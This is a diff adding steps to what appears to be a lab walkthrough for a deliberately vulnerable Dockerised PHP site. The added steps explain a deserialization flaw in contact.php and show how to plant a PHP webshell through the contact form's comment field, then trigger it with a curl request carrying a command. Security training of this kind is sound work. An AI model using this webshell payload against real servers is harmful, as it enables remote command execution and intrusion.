@@ -85,7 +85,8 @@ Docker run -d -p 6080:80 <image tag name>
    entered by user, we can see the source code of this file by entering the URL:
    http://<victim's IP address>/debug.php?read=contact.php
 
-11.
+11. Upon reviewing the source code of contact.php file, what have you found? There is a
+   critical vulnerability in the file, a deserialization vulnerability.
    ```
    <?php
    # Omitted some code
@@ -113,4 +114,31 @@ Docker run -d -p 6080:80 <image tag name>
    }
    ?>
    ```
+12. A closer look at the preceding code reveals that the vulnerability exists in the magic
+   function __sleep() defined in the class customer. The logic in the function __sleep()
+   shows that once an instance of class customer is serialized, it will write a file to a
+   directory in the web root directory.
 
+13. Now we know there is a vulnerability in the code, how do we use this vulnerability?
+   Recall earlier I asked you to find the parameter you can interact with on the website,
+   there is a webpage where you can enter user defined text. To navigate to this page, enter
+   the URL http://<victim_ip>/contact.html to access the page.
+
+14. On this page, there are three parameters you can define: name, email, and comment. If
+    you still remember the source code of the contact.php file, you can make an educated
+    guess that the contact.php will handle the post request sent by contact.html form. If you
+    want to verify that, you can also download burpsuites and verify. Or you can also
+    examine the source code of the contact.html page to see where the POST request is sent
+    to.
+
+16. To exploit the vulnerability we see before, enter test in the name bar, enter user.php in the
+    email bar, and <?php $exec = system( $_GET['cmd'] ) ?> in the comment section. After
+    entering all the text, click submit to plant the webshell
+
+17. On the attacker VM, use the command curl
+    http://<victim's IP address>/user_info/test_user.php?cmd=whoami to test whether the planted
+    webshell is working or not.
+
+18. A secure server is running on the address <secure's IP address>, you are welcome to try attacking
+    it, but it does not have the deserialization vulnerability and misconfiguration present on
+    the victim VM.
